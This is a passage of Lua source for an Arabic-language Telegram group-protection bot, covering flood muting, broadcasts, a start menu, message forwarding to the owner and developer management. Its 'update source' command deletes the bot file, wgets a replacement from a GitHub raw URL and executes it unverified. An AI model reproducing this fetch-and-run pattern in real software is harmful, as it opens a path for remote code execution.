if data.messages_[0] ~= false then
if tonumber(my_ide) == (data.messages_[0].sender_user_id_) then
DeleteMessage(msg.chat_id_, {[0] = data.messages_[0].id_})
end;end;end, nil)
msgm = msgm - 1048576
end
end 
if type == 'keed' then
https.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..msg.sender_user_id_.."") 
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_) 
msgm = msg.id_
my_ide = msg.sender_user_id_
local num = 100
for i=1,tonumber(num) do
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = {[0] = msgm}},function(arg,data) 
if data.messages_[0] ~= false then
if tonumber(my_ide) == (data.messages_[0].sender_user_id_) then
DeleteMessage(msg.chat_id_, {[0] = data.messages_[0].id_})
end;end;end, nil)
msgm = msgm - 1048576
end
Text = '\n ◉ العضــو ← '..Name..'\n ◉ قام بالتكرار هنا وتم تقييده '  
sendText(msg.chat_id_,Text,0,'md')
return false  
end  
if type == 'mute' then
Text = '\n ◉ العضــو ← '..Name..'\n ◉ قام بالتكرار هنا وتم كتمه '  
sendText(msg.chat_id_,Text,0,'md')
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_) 
msgm = msg.id_
my_ide = msg.sender_user_id_
local num = 100
for i=1,tonumber(num) do
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = {[0] = msgm}},function(arg,data) 
if data.messages_[0] ~= false then
if tonumber(my_ide) == (data.messages_[0].sender_user_id_) then
DeleteMessage(msg.chat_id_, {[0] = data.messages_[0].id_})
end;end;end, nil)
msgm = msgm - 1048576
end
return false  
end
end,nil)   
end  
function plugin_Dragon(msg)
for v in io.popen('ls File_Bot'):lines() do
if v:match(".lua$") then
plugin = dofile("File_Bot/"..v)
if plugin.Dragon and msg then
pre_msg = plugin.Dragon(msg)
end
end
end
send(msg.chat_id_, msg.id_,pre_msg)  
end

--------------------------------------------------------------------------------------------------------------
function SourceDRAGON(msg,data) -- بداية العمل
if msg then
local text = msg.content_.text_
--------------------------------------------------------------------------------------------------------------
if msg.chat_id_ then
local id = tostring(msg.chat_id_)
if id:match("-100(%d+)") then
database:incr(bot_id..'Msg_User'..msg.chat_id_..':'..msg.sender_user_id_) 
Chat_Type = 'GroupBot' 
elseif id:match("^(%d+)") then
database:sadd(bot_id..'User_Bot',msg.sender_user_id_)  
Chat_Type = 'UserBot' 
else
Chat_Type = 'GroupBot' 
end
end
if database:get(bot_id.."Bc:Grops:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == "الغاء" or text == "الغاء ◉" then   
send(msg.chat_id_, msg.id_," ◉ تم الغاء الاذاعه")
database:del(bot_id.."Bc:Grops:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end 
local list = database:smembers(bot_id.."Chek:Groups") 
if msg.content_.text_ then
for k,v in pairs(list) do 
send(v, 0,"["..msg.content_.text_.."]")  
database:set(bot_id..'Msg:Pin:Chat'..v,msg.content_.text_) 
end
elseif msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
elseif msg.content_.photo_.sizes_[1] then
photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
for k,v in pairs(list) do 
sendPhoto(v, 0, photo,(msg.content_.caption_ or ""))
database:set(bot_id..'Msg:Pin:Chat'..v,photo) 
end 
elseif msg.content_.animation_ then
for k,v in pairs(list) do 
sendDocument(v, 0, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or "")) 
database:set(bot_id..'Msg:Pin:Chat'..v,msg.content_.animation_.animation_.persistent_id_)
end 
elseif msg.content_.sticker_ then
for k,v in pairs(list) do 
sendSticker(v, 0, msg.content_.sticker_.sticker_.persistent_id_)   
database:set(bot_id..'Msg:Pin:Chat'..v,msg.content_.sticker_.sticker_.persistent_id_) 
end 
end
send(msg.chat_id_, msg.id_," ◉ تمت الاذاعه الى *~ "..#list.." ~* جروب ")
database:del(bot_id.."Bc:Grops:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end
--------------------------------------------------------------------------------------------------------------
if Chat_Type == 'UserBot' then
if text == '/start' or text == 'العوده' then  
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if text == "/start" then
if not DevSoFi(msg) then
local Namebot = (database:get(bot_id..'Name:Bot') or 'الفا') 
local DRAGON_Msg = { 
' 🔵°اهـــلا انا بـوت اسمــي '..Namebot..' ⛓│آختـصاصـي حمايـه آلمجـموعـات ..🥺\n🔵│ مـن آلسـبآم وآلتوجيه وآلتكرآر وآلخ..\n🚸╽ لتفعيل آلبوت آتبــع الشـروط 😈❕\n↫ ❬اضف البوت الى المجموعه❭\n↫ ❬ارفع البوت ادمن في المجموعه❭\n↫ ❬وارسل تفعيل وسيتم تفعيل البوت ورفع مشرفي الكروب تلقائين ❭',
} 
Namebot = DRAGON_Msg[math.random(#DRAGON_Msg)] 
local msg_id = msg.id_/2097152/0.5  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'الـمـطـور', url="http://t.me/"..sudos.UserName},
},
{
{text = 'اضف البوت لمجموعتك 𖠕', url="http://t.me/"..sudos.UserName.."?startgroup=new"},
},
}
local function getpro(extra, result, success) 
if result.photos_[0] then 
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo='..result.photos_[0].sizes_[1].photo_.persistent_id_..'&caption=' .. URL.escape(Namebot).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
else 
send(msg.chat_id_, msg.id_,Namebot, 1, 'md') 
end 
end 
tdcli_function ({ ID = "GetUserProfilePhotos", user_id_ = bot_id, offset_ = 0, limit_ = 1 }, getpro, nil) 
end
end
if DevSoFi(msg) then
local bl = '◉ مرحبا بك في اوامر المطور الجاهزه\n ◉ قناة السورس\n'
local keyboard = {
{'كمال','ماديسون '},
{'ضع اسم للبوت'},
{'اوامر الاذاعه','اوامر التفعيل','اوامر التعطيل'},
{'الاحصائيات'},
{'اوامر الجلب','اوامر المسح','اوامر الردود'},
{'تحديث السورس'},
{'معلومات السيرفر','الغاء'},
}
send_inline_key(msg.chat_id_,bl,keyboard)
else
if not database:get(bot_id..'Start:Time'..msg.sender_user_id_) then
local start = database:get(bot_id.."Start:Bot")  
if start then 
SourceDRAGONr = start
else
SourceDRAGONr = '◉اهلا عزيزي\n◉انا بوت اسمي الفا\n◉اختصاصي حمايه الكروبات\n◉من تكرار والسبام والتوجيه والخ…\n◉لتفعيلي اتبع الاخطوات…↓\n◉اضفني الي مجموعتك وقم بترقيتي ادمن واكتب كلمه { تفعيل }  ويستطيع ←{ منشئ او المشرفين } بتفعيل فقط\n[◉معرف المطور '
end 
send(msg.chat_id_, msg.id_, SourceDRAGONr) 
end
if not database:get(bot_id..'Start:Time'..msg.sender_user_id_) then
local start = database:get(bot_id.."Start:Bot")  
if start then 
keyboard = start
else
keyboard = {
{'الصلاوات','اذكار','القران'},
{'جمالي','متحركه','استوري','غنيلي'},
{'•━═━═━═『𝙰𝚕𝚏𝚊』═━═━═━•'},
{'ثمات','روايات','افلام','اغاني'},
{'خلفيات','كتبات','بوستات','نكت'},
{'•━═━═━═『𝙰𝚕𝚏𝚊』═━═━═━•'},
{'عقاب','الالعاب','صراحه','تويت'},
{'المليون','مريم','تصميم'},
{'•━═━═━═『𝙰𝚕𝚏𝚊』═━═━═━•'},
{'تحليل','اسئله','مهنتي','نمله'},
{'مستقبلي','لو خيروك','حساب الوزن'},
{'•━═━═━═『𝙰𝚕𝚏𝚊』═━═━═━•'},
{'كشف الكدب','نسبه الغباء','نسبه الحب'},
{'كمال','يوتيوب','ماديسون'},
}
end
send_inline_key(msg.chat_id_, msg.id_, keyboard) 
end
end
database:setex(bot_id..'Start:Time'..msg.sender_user_id_,300,true)
return false
end
if text == 'اوامر الاذاعه' then  
local bl = 'مرحبا بك في اوامر الاذاعه..💘🙂'
local keyboard = {
{'اذاعه بالتوجيه خاص','اذاعه بالتوجيه'},
{'اذاعه بالتثبيت'},
{'اذاعه خاص','اذاعه'},
{'العوده'},
}
send_inline_key(msg.chat_id_,bl,keyboard)
end
if text == 'اوامر التفعيل' then  
local bl = 'مرحبا بك في اوامر التفعيل..🌚♥️'
local keyboard = {
{'تفعيل الاذاعه','تفعيل التواصل'},
{'تفعيل المغادره','تفعيل البوت خدمي'},
{'العوده'},
}
send_inline_key(msg.chat_id_,bl,keyboard)
end
if text == 'اوامر التعطيل' then  
local bl = 'مرحبا بك في اوامر التعطيل..🌚💘'
local keyboard = {
{'تعطيل الاذاعه','تعطيل التواصل'},
{'تعطيل المغادره','تعطيل البوت خدمي'},
{'العوده'},
}
send_inline_key(msg.chat_id_,bl,keyboard)
end
if text == 'اوامر الردود' then  
local bl = 'مرحبا بك في اوامر الردود..🥺💘'
local keyboard = {
{'اضف رد عام','مسح رد عام'},
{'الردود العامه'},
{'اضف رد متعدد','مسح رد متعدد'},
{'الردود المتعدده'},
{'العوده'},
}
send_inline_key(msg.chat_id_,bl,keyboard)
end
if text == 'اوامر الجلب' then  
local bl = 'مرحبا بك في اوامر الجلب والاحضار..🌚♥️'
local keyboard = {
{'جلب نسخه الاحتياطيه','جلب المشتركين'},
{'جلب المطورين'},
{'المشتركين','الجروبات '},
{'العوده'},
}
send_inline_key(msg.chat_id_,bl,keyboard)
end
if text == 'اوامر المسح' then  
local bl = 'مرحبا بك في اوامر المسح..💛🌚'
local keyboard = {
{'مسح المطورين','المطورين'},
{'مسح الثانوين','الثانوين'},
{'مسح الجروبات','مسح المشتركين'},
{'مسح قائمه العام','قائمه العام'},
{'العوده'},
}
send_inline_key(msg.chat_id_,bl,keyboard)
end
if not DevSoFi(msg) and not database:sismember(bot_id..'Ban:User_Bot',msg.sender_user_id_) and not database:get(bot_id..'Tuasl:Bots') then
send(msg.sender_user_id_, msg.id_,'◉ تـم ارسـال رسالـتك للمـطور')
tdcli_function ({ID = "ForwardMessages", chat_id_ = SUDO,    from_chat_id_ = msg.sender_user_id_,    message_ids_ = {[0] = msg.id_},    disable_notification_ = 1,    from_background_ = 1 },function(arg,data) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,ta) 
vardump(data)
if data and data.messages_[0].content_.sticker_ then
local Name = '['..string.sub(ta.first_name_,0, 40)..'](tg://user?id='..ta.id_..')'
local Text = ' ◉ تم ارسال الملصق من ↓\n - '..Name
sendText(SUDO,Text,0,'md')
end 
end,nil) 
end,nil)
end
if DevSoFi(msg) and msg.reply_to_message_id_ ~= 0  then    
tdcli_function({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)},function(extra, result, success) 
if result.forward_info_.sender_user_id_ then     
id_user = result.forward_info_.sender_user_id_    
end     
tdcli_function ({ID = "GetUser",user_id_ = id_user},function(arg,data) 
if text == 'حظر' then
local Name = '['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..id_user..')'
local Text = ' ◉ المستخدم ← '..Name..'\n ◉ تم حظره من التواصل'
sendText(SUDO,Text,msg.id_/2097152/0.5,'md')
database:sadd(bot_id..'Ban:User_Bot',data.id_)  
return false  
end 
if text =='الغاء الحظر' then
local Name = '['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..id_user..')'
local Text = ' ◉ المستخدم ← '..Name..'\n ◉ تم الغاء حظره من التواصل'
sendText(SUDO,Text,msg.id_/2097152/0.5,'md')
database:srem(bot_id..'Ban:User_Bot',data.id_)  
return false  
end 

tdcli_function({ID='GetChat',chat_id_ = id_user},function(arg,dataq)
tdcli_function ({ ID = "SendChatAction",chat_id_ = id_user, action_ = {  ID = "SendMessageTypingAction", progress_ = 100} },function(arg,ta) 
if ta.code_ == 400 or ta.code_ == 5 then
local DRAGON_Msg = '\n ◉ قام الشخص بحظر البوت'
send(msg.chat_id_, msg.id_,DRAGON_Msg) 
return false  
end 
if text then    
send(id_user,msg.id_,text)    
local Name = '['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..id_user..')'
local Text = ' ◉ المستخدم ← '..Name..'\n ◉ تم ارسال الرساله اليه'
sendText(SUDO,Text,msg.id_/2097152/0.5,'md')
return false
end    
if msg.content_.ID == 'MessageSticker' then    
sendSticker(id_user, msg.id_, 0, 1, nil, msg.content_.sticker_.sticker_.persistent_id_)   
local Name = '['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..id_user..')'
local Text = ' ◉ المستخدم ← '..Name..'\n ◉ تم ارسال الرساله اليه'
sendText(SUDO,Text,msg.id_/2097152/0.5,'md')
return false
end      
if msg.content_.ID == 'MessagePhoto' then    
sendPhoto(id_user, msg.id_, 0, 1, nil,msg.content_.photo_.sizes_[0].photo_.persistent_id_,(msg.content_.caption_ or ''))    
local Name = '['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..id_user..')'
local Text = ' ◉ المستخدم ← '..Name..'\n ◉ تم ارسال الرساله اليه'
sendText(SUDO,Text,msg.id_/2097152/0.5,'md')
return false
end     
if msg.content_.ID == 'MessageAnimation' then    
sendDocument(id_user, msg.id_, 0, 1,nil, msg.content_.animation_.animation_.persistent_id_)    
local Name = '['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..id_user..')'
local Text = ' ◉ المستخدم ← '..Name..'\n ◉ تم ارسال الرساله اليه'
sendText(SUDO,Text,msg.id_/2097152/0.5,'md')
return false
end     
if msg.content_.ID == 'MessageVoice' then    
sendVoice(id_user, msg.id_, 0, 1, nil, msg.content_.voice_.voice_.persistent_id_)    
local Name = '['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..id_user..')'
local Text = ' ◉ المستخدم ← '..Name..'\n ◉ تم ارسال الرساله اليه'
sendText(SUDO,Text,msg.id_/2097152/0.5,'md')
return false
end     
end,nil)
end,nil)
end,nil)
end,nil)
end
if text == 'تفعيل التواصل ' and DevSoFi(msg) then  
if database:get(bot_id..'Tuasl:Bots') then
database:del(bot_id..'Tuasl:Bots') 
Text = '\n ◉ تم تفعيل التواصل ' 
else
Text = '\n ◉ بالتاكيد تم تفعيل التواصل '
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل التواصل ' and DevSoFi(msg) then  
if not database:get(bot_id..'Tuasl:Bots') then
database:set(bot_id..'Tuasl:Bots',true) 
Text = '\n ◉ تم تعطيل التواصل' 
else
Text = '\n ◉ بالتاكيد تم تعطيل التواصل'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل البوت الخدمي ' and DevSoFi(msg) then  
if database:get(bot_id..'Free:Bots') then
database:del(bot_id..'Free:Bots') 
Text = '\n ◉ تم تفعيل البوت الخدمي ' 
else
Text = '\n ◉ بالتاكيد تم تفعيل البوت الخدمي '
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل البوت الخدمي ' and DevSoFi(msg) then  
if not database:get(bot_id..'Free:Bots') then
database:set(bot_id..'Free:Bots',true) 
Text = '\n ◉ تم تعطيل البوت الخدمي' 
else
Text = '\n ◉ بالتاكيد تم تعطيل البوت الخدمي'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text and database:get(bot_id..'Start:Bots') then
if text == 'الغاء' or text == 'الغاء' then   
send(msg.chat_id_, msg.id_,' ◉ الغاء حفظ كليشه ستارت')
database:del(bot_id..'Start:Bots') 
return false
end
database:set(bot_id.."Start:Bot",text)  
send(msg.chat_id_, msg.id_,' ◉ تم حفظ كليشه ستارت')
database:del(bot_id..'Start:Bots') 
return false
end

if text == 'تحديث السورس ' and DevSoFi(msg) then 
os.execute('rm -rf DRAGON.lua')
os.execute('wget https://raw.githubusercontent.com/MADISON11110/ALFAA/main/DRAGON.lua')
send(msg.chat_id_, msg.id_,'◉ تم تحديث السورس')
dofile('DRAGON.lua')  
end

if text == 'قناه السورس' and DevSoFi(msg) then
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
[اضغط هنا وانضم الي قناه السورس](t.me/so_alfaa )
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'قناه السورس️️', url="t.me/so_alfaa "}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == "ضع اسم للبوت" and DevSoFi(msg) then  
database:setex(bot_id..'Set:Name:Bot'..msg.sender_user_id_,300,true) 
send(msg.chat_id_, msg.id_," ◉ ارسل اليه الاسم الان ")
return false
end
if text == ("مسح المطورين") and DevSoFi(msg) then
database:del(bot_id..'Sudo:User')
send(msg.chat_id_, msg.id_, "\n ◉ تم مسح قائمة المطورين  ")
end
if text == ("الثانوين") and SudoBot(msg) then
local list = database:smembers(bot_id.."Dev:SoFi:2")
t = "\n◉ قائمة مطورين الثانويين للبوت \n╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = "◉ لا يوجد مطورين ثانويين"
end
send(msg.chat_id_, msg.id_, t)
end
if text == ("مسح الثانوين") and SudoBot(msg) then
database:del(bot_id.."Dev:SoFi:2")
send(msg.chat_id_, msg.id_, "\n◉ تم مسح قائمة المطورين الثانوين  ")
end

if text == 'الاحصائيات' and DevSoFi(msg) then 
local Groups = database:scard(bot_id..'Chek:Groups')  
local Users = database:scard(bot_id..'User_Bot')  
Text = ' الاحصائيات ◉ \n'..' ◉ عدد الجروبات ← {'..Groups..'}'..'\n ◉  عدد المشتركين ← {'..Users..'}'
send(msg.chat_id_, msg.id_,Text) 
return false
end
if text == 'المشتركين ' and DevSoFi(msg) then 
local Groups = database:scard(bot_id..'Chek:Groups')  
local Users = database:scard(bot_id..'User_Bot')  
Text = '\n ◉ المشتركين←{`'..Users..'`}'
send(msg.chat_id_, msg.id_,Text) 
return false
end
if text == 'الجروبات ' and DevSoFi(msg) then 
local Groups = database:scard(bot_id..'Chek:Groups')  
local Users = database:scard(bot_id..'User_Bot')  
Text = '\n ◉ الجروبات←{`'..Groups..'`}'
send(msg.chat_id_, msg.id_,Text) 
return false
end
if text == ("المطورين") and DevSoFi(msg) then
local list = database:smembers(bot_id..'Sudo:User')
t = "\n ◉ قائمة المطورين \n╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- ("..v..")\n"
end
end
if #list == 0 then
t = " ◉ لا يوجد مطورين"
end
send(msg.chat_id_, msg.id_, t)
end
if text == ("قائمه العام") and DevSoFi(msg) then
local list = database:smembers(bot_id..'GBan:User')
t = "\n ◉ قائمه المحظورين عام \n╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- ("..v..")\n"
end
end
if #list == 0 then
t = " ◉ لا يوجد محظورين عام"
end
send(msg.chat_id_, msg.id_, t)
return false
end
if text == ("قائمه الكتم العام") and DevSoFi(msg) then
local list = database:smembers(bot_id..'Gmute:User')
t = "\n ◉ قائمة المكتومين عام \n╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- ("..v..")\n"
end
end
if #list == 0 then
t = " ◉ لا يوجد مكتومين عام"
end
send(msg.chat_id_, msg.id_, t)
return false
end
if text=="اذاعه خاص " and msg.reply_to_message_id_ == 0 and DevSoFi(msg) then 
database:setex(bot_id.."Send:Bc:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," ◉ ارسل الان اذاعتك؟ \n ◉ للخروج ارسل الغاء ")
return false
end 
if text=="اذاعه " and msg.reply_to_message_id_ == 0 and DevSoFi(msg) then 
database:setex(bot_id.."Send:Bc:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," ◉ ارسل الان اذاعتك؟ \n ◉ للخروج ارسل الغاء ")
return false
end  
if text=="اذاعه بالتثبيت" and msg.reply_to_message_id_ == 0 and DevSoFi(msg) then 
database:setex(bot_id.."Bc:Grops:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," ◉ ارسل الان اذاعتك؟ \n ◉ للخروج ارسل الغاء ")
return false
end 
if text=="اذاعه بالتوجيه " and msg.reply_to_message_id_ == 0  and DevSoFi(msg) then 
database:setex(bot_id.."Send:Fwd:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," ◉ ارسل لي التوجيه الان")
return false
end 
if text=="اذاعه بالتوجيه خاص " and msg.reply_to_message_id_ == 0  and DevSoFi(msg) then 
database:setex(bot_id.."Send:Fwd:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," ◉ ارسل لي التوجيه الان")
return false
end 
if text == 'جلب نسخه الاحتياطيه' and DevSoFi(msg) then 
GetFile_Bot(msg)
end
if text == "مسح المشتركين " and DevSoFi(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي ◉ •\n• لايمكنك استخدام البوت ◉ •\n• عليك الاشتراك في القناة ◉ •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
local pv = database:smembers(bot_id.."User_Bot")
local sendok = 0
for i = 1, #pv do
tdcli_function({ID='GetChat',chat_id_ = pv[i]
},function(arg,dataq)
tdcli_function ({ ID = "SendChatAction",  
chat_id_ = pv[i], action_ = {  ID = "SendMessageTypingAction", progress_ = 100} 
},function(arg,data) 
if data.ID and data.ID == "Ok"  then
else
database:srem(bot_id.."User_Bot",pv[i])
sendok = sendok + 1
end
if #pv == i then 
if sendok == 0 then
send(msg.chat_id_, msg.id_,'◉ لا يوجد مشتركين وهميين في البوت \n')   
else
local ok = #pv - sendok
send(msg.chat_id_, msg.id_,'◉ عدد المشتركين الان ← ( '..#pv..' )\n◉ تم ازالة ← ( '..sendok..' ) من المشتركين\n◉  الان عدد المشتركين الحقيقي ← ( '..ok..' ) مشترك \n')   
end
end
end,nil)
end,nil)
end
return false
end
if text == "مسح الجروبات " and DevSoFi(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي ◉ •\n• لايمكنك استخدام البوت ◉ •\n• عليك الاشتراك في القناة ◉ •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
local group = database:smembers(bot_id..'Chek:Groups') 
local w = 0
local q = 0
for i = 1, #group do
tdcli_function({ID='GetChat',chat_id_ = group[i]
},function(arg,data)
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusMember" then
database:srem(bot_id..'Chek:Groups',group[i])  
tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_=group[i],user_id_=bot_id,status_={ID = "ChatMemberStatusLeft"},},function(e,g) end, nil) 
w = w + 1
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusLeft" then
database:srem(bot_id..'Chek:Groups',group[i])  
q = q + 1
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusKicked" then
database:srem(bot_id..'Chek:Groups',group[i])  
q = q + 1
end
if data and data.code_ and data.code_ == 400 then
database:srem(bot_id..'Chek:Groups',group[i])  
w = w + 1
end
if #group == i then 
if (w + q) == 0 then
send(msg.chat_id_, msg.id_,'◉ لا يوجد جروبات وهميه في البوت\n')   
else
local DRAGON = (w + q)
local sendok = #group - DRAGON
if q == 0 then
DRAGON = ''
else
DRAGON = '\n◉ تم ازالة ← { '..q..' } جروبات من البوت'
end
if w == 0 then
DRAGONk = ''
else
DRAGONk = '\n◉ تم ازالة ← {'..w..'} جروب لان البوت عضو'
end
send(msg.chat_id_, msg.id_,'◉  عدد الجروبات الان ← { '..#group..' }'..DRAGONk..''..DRAGON..'\n◉  الان عدد الجروبات الحقيقي ← { '..sendok..' } جروبات\n')   
end
end
end,nil)
end
return false
end


if text and text:match("^رفع مطور @(.*)$") and DevSoFi(msg) then
local username = text:match("^رفع مطور @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_," ◉ عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")
return false 
end      
database:sadd(bot_id..'Sudo:User', result.id_)
usertext = '\n ◉ العضو ← ['..result.title_..'](t.me/'..(username or 'so_alfaa ')..')'
status  = '\n ◉ تم ترقيته مطور'
texts = usertext..status
else
texts = ' ◉ لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false 
end
if text and text:match("^رفع مطور (%d+)$") and DevSoFi(msg) then
local userid = text:match("^رفع مطور (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:sadd(bot_id..'Sudo:User', userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'so_alfaa ')..')'
status  = '\n ◉ تم ترقيته مطور'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n ◉ العضو ← '..userid..''
status  = '\n ◉ تم ترقيته مطور'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false 
end
if text and text:match("^تنزيل مطور @(.*)$") and DevSoFi(msg) then
local username = text:match("^تنزيل مطور @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
database:srem(bot_id..'Sudo:User', result.id_)
usertext = '\n ◉ العضو ← ['..result.title_..'](t.me/'..(username or 'so_alfaa ')..')'
status  = '\n ◉ تم تنزيله من المطورين'
texts = usertext..status
else
texts = ' ◉ لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end  
if text and text:match("^تنزيل مطور (%d+)$") and DevSoFi(msg) then
local userid = text:match("^تنزيل مطور (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:srem(bot_id..'Sudo:User', userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'so_alfaa ')..')'
status  = '\n ◉ تم تنزيله من المطورين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n ◉ العضو ← '..userid..''
status  = '\n ◉ تم تنزيله من المطورين'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false 
end

end
--------------------------------------------------------------------------------------------------------------
if text == ("مسح المميزين عام") and SudoBot(msg) then
database:del(bot_id..'Mamez:User')
send(msg.chat_id_, msg.id_, "\n•  تم مسح قائمة المميزين عام  ")
end
if text == ("المميز العام") and SudoBot(msg) then
local list = database:smembers(bot_id..'Mamez:User')
t = "\n*• قائمة مميز العام البوت \n *܀⠤⠤⠤⠤⠤⠤܀ٴ*\n*"
